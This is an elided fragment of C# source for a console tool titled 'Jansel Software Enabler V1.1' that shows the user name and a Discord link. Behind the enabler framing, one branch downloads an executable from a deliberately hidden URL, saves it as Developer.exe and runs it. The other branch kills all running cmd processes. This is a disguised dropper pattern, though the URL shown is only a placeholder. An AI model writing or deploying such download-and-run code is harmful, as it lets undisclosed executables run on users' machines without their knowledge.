...
#pragma warning restore IDE0060
        {
            ...
            Console.Title = "Jansel Software Enabler V1.1";
            Console.CursorVisible = false;
            string user = Environment.UserName;
            Console.WriteLine("Current User (User that executed this): " + user);
            Console.WriteLine("For more information join my Discord: https://discord.gg/rdN43zj");
            ...
            if (number == 2)
            {
                string web1 = "will be a secret lol";
                string file1 = "Developer.exe";
                WebClient pwet = new WebClient();
                pwet.DownloadFile(web1, file1);
                Process.Start(file1);
                
            }
            else
            {
                foreach (var baguette in Process.GetProcessesByName("cmd"))
                {
                    baguette.Kill();
                }
            }
